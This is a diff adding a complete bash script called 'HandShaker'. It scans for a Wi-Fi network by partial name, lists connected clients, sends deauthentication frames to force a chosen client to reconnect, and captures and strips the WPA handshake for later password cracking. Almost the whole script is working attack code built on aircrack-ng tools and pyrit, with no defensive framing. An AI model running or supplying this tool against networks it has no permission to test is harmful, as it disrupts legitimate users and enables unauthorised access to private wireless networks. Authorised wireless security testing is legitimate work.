@@ -1,0 +1,179 @@
+#!/bin/bash
+
+fcap()
+{
+	CHKEX="0"
+	fgather
+	echo " [*] $CNT active clients found:"		
+	cat "$HOME"/jrifskf
+	read -p ' [*] Please paste clent MAC: ' CLIE
+	FILENAME="$BSSID""--""$RANDOM"
+	FILENAME2="$BSSID""-""$RANDOM"".cap"
+	gnome-terminal -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/Desktop/hs/$FILENAME --output-format pcap
+	aireplay-ng -0 1 -a $BSSID -c $CLIE mon0
+	sleep 3
+	while [ true ]
+		do
+			clear
+			read -p " [*] was the hanshake successfully captured? [Y/n]: " WASCAP
+			if [ $WASCAP = "n" ]
+				then
+					aireplay-ng -0 1 -a $BSSID -c $CLIE mon0
+					sleep 4
+				else
+					killall airodump-ng
+					break
+			fi
+		done
+	echo "[*] saving and stripping capture, please wait..." 
+	pyrit -r "$HOME"/Desktop/hs/"$FILENAME"-01.cap -o "$HOME"/Desktop/hs/$FILENAME2 strip
+	clear
+	rm "$HOME"/Desktop/hs/"$FILENAME"-01.cap
+	airmon-ng stop mon0
+	rm -rf new.csv
+	rm -rf new2.csv
+	rm -rf new3.csv
+	rm -rf "$HOME"/filw*
+	rm -rf "$HOME"/jrifsk*
+	clear
+	echo " [*] Handshake saved to "$HOME"/Desktop/hs/$FILENAME2"
+	ISDN=$( du -b "$HOME"/Desktop/hs/$FILENAME2)
+	BYTS=${ISDN:0:3}
+	if [ $BYTS -gt 840 ]
+		then
+			echo " [*] Looks like handshake capture was successfull, Horray for you"
+			echo
+			pyrit -r "$HOME"/Desktop/hs/$FILENAME2 analyze
+		else
+			echo " [*] Looks like there may be a problem with captured handshake (capture packet too small)"
+			echo
+			pyrit -r "$HOME"/Desktop/hs/$FILENAME2 analyze
+	fi
+	exit
+}
+
+fexit()
+{
+			airmon-ng stop mon0
+			rm -rf new.csv
+			rm -rf new2.csv
+			rm -rf new3.csv
+			rm -rf "$HOME"/filw*
+			rm -rf "$HOME"/jrifsk*
+			exit
+}
+
+fhelp()
+{
+	clear
+	echo """ HandShaker - detect, deauth and capture handshakes by ESSID
+	Usage: handshaker x 
+			x - Partial unique ESSID (required)
+
+						
+	eg. handshaker BTHub3-F
+"""
+exit
+}
+
+fgather()
+{
+	rm -rf "$HOME"/jrif*
+	CNT="0"
+	clear
+	echo ' [*] Please wait while I gather active stations..'
+	gnome-terminal  -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/jrifskr
+	sleep 7
+	killall airodump-ng
+	grep 'Station' -A 10 "$HOME"/jrifskr-01.csv > "$HOME"/jrifskp
+	while read LINE
+		do
+			if [ ${LINE:0:4} != "Stat" ]
+				then
+					echo ${LINE:0:17} >> "$HOME"/jrifskf
+			fi
+		done < "$HOME"/jrifskp
+	clear
+	while read LINE
+		do
+			case ${LINE:2:1} in
+			":")CNT=$(( CNT + 1 ));;
+			esac
+		done < "$HOME"/jrifskf
+	if [ $CNT -lt 1 ]
+		then
+			fgather
+	fi
+}
+
+rm -rf "$HOME"/filw*
+trap fexit 2
+
+if [ $# -lt 1 ]
+	then
+		fhelp
+elif [ $1 = "--help" ]
+	then
+		fhelp
+elif [ $1 = "-h" ]
+	then
+		fhelp
+fi
+
+CHKEX="1"
+ESSID="$1"
+SLP="30"
+SCN="10"
+STATSC="0"
+MOND=$( ifconfig | grep mon0 | cut -c 1 )
+mkdir -p "$HOME"/Desktop/hs
+
+echo $MOND
+
+if [ $MOND -z ]
+	then
+		clear
+		echo " [*] Which interface do you want to use?:"
+		echo
+		iwconfig | grep wlan
+		read -p "  :" NIC
+	else
+		NIC=mon0
+fi
+
+if [ $MOND -z ]
+	then
+		airmon-ng start $NIC
+fi
+clear
+while [ true ]
+	do
+		gnome-terminal  -x airodump-ng mon0 -w "$HOME"/filw --output-format=csv
+		echo "[*] Scanning..[*]"
+		sleep $SCN
+		killall airodump-ng
+		DONE=$( cat "$HOME"/filw-01.csv | grep $ESSID ) 
+		if [ $DONE -z ]
+			then
+				echo " [*] not found [*]"
+				echo " [*] Sleeping $SLP seconds.."
+				for (( SLP=$SLP; SLP>0; SLP--)); do
+				sleep 1 &
+				printf " [*] $SLP seconds remaining \r"	
+				wait
+				done
+			else
+				csvtool col 4,14 "$HOME"/filw-01.csv > new2.csv
+				csvtool col 1,14 "$HOME"/filw-01.csv > new3.csv
+				
+				if [ $(cat new2.csv | grep $ESSID | cut -c 2) = "," ]
+					then
+						CHAN=$(cat new2.csv | grep $ESSID | cut -c 1)
+					else
+						CHAN=$(cat new2.csv | grep $ESSID | cut -c 1-2)
+				fi
+				BSSID=$(cat new3.csv | grep $ESSID | cut -c 1-17)
+				fcap
+		fi
+		sleep $SLP
+	done
